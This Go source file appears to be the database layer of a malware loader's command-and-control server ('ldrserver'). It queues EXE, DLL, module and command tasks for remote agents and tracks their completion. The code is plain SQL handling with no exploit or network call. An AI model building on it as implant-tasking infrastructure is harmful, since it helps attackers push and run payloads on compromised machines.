package database

import (
	"database/sql"
	"fmt"

	"ldrserver/internal/parser"
)

const (
	FileTypeExe = 0xac
	FileTypeDll = 0xab

	taskModule = 0x3
	taskCmd    = 0x5
)

func fileTypeForKind(kind string) (int, bool) {
	switch kind {
	case "exe":
		return FileTypeExe, true
	case "dll":
		return FileTypeDll, true
	default:
		return 0, false
	}
}

func (db *DB) InsertTask(agentUUID string, taskCode int, fileUUID string) error {
	var kind string
	var hasReloc int
	if err := db.conn.QueryRow(
		`SELECT kind, has_reloc FROM files WHERE uuid = ?`, fileUUID,
	).Scan(&kind, &hasReloc); err != nil {
		return err
	}

	fileType, ok := fileTypeForKind(kind)
	if !ok {
		return fmt.Errorf("unsupported file kind: %s", kind)
	}

	_, err := db.conn.Exec(
		`INSERT INTO tasks (agent_uuid, code, file_type, has_reloc, has_args, file_uuid)
		 VALUES (?, ?, ?, ?, 0, ?)`,
		agentUUID, taskCode, fileType, hasReloc, fileUUID,
	)
	return err
}

func (db *DB) InsertModuleTask(agentUUID, module string, hasArgs int, args string) error {
	_, err := db.conn.Exec(
		`INSERT INTO tasks (agent_uuid, code, file_type, has_reloc, has_args, module, args)
		 VALUES (?, ?, ?, 0, ?, ?, ?)`,
		agentUUID, taskModule, FileTypeDll, hasArgs, module, args,
	)
	return err
}

// InsertCmdTask queues a built-in agent command. It reuses the module/args
// columns so no schema change is needed; code=taskCmd tells the agent to
// dispatch it internally rather than load a module payload.
func (db *DB) InsertCmdTask(agentUUID, name string, hasArgs int, args string) error {
	_, err := db.conn.Exec(
		`INSERT INTO tasks (agent_uuid, code, file_type, has_reloc, has_args, module, args)
		 VALUES (?, ?, 0, 0, ?, ?, ?)`,
		agentUUID, taskCmd, hasArgs, name, args,
	)
	return err
}

func (db *DB) GetTasks(id string) (*parser.Tasks, error) {
	rows, err := db.conn.Query(
		`SELECT id, code, file_type, has_reloc, has_args, file_uuid, module, args
		 FROM tasks WHERE agent_uuid = ? AND status = 0 LIMIT 3`, id)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var tasks []parser.Task
	for rows.Next() {
		var t parser.Task
		var fileUUID sql.NullString
		var module sql.NullString
		var args sql.NullString
		if err := rows.Scan(&t.Id, &t.Code, &t.FileType, &t.HasReloc, &t.HasArgs, &fileUUID, &module, &args); err != nil {
			return nil, err
		}
		t.FileUUID = fileUUID.String
		t.Module = module.String
		t.Args = args.String
		tasks = append(tasks, t)
	}

	if tasks == nil {
		tasks = []parser.Task{}
	}

	return &parser.Tasks{Total: len(tasks), Task: tasks}, nil
}

func (db *DB) MarkTaskAsDone(id int) error {
	res, err := db.conn.Exec(`UPDATE tasks SET status = 1 WHERE id = ?`, id)
	if err != nil {
		return err
	}
	if n, _ := res.RowsAffected(); n == 0 {
		return sql.ErrNoRows
	}
	return nil
}
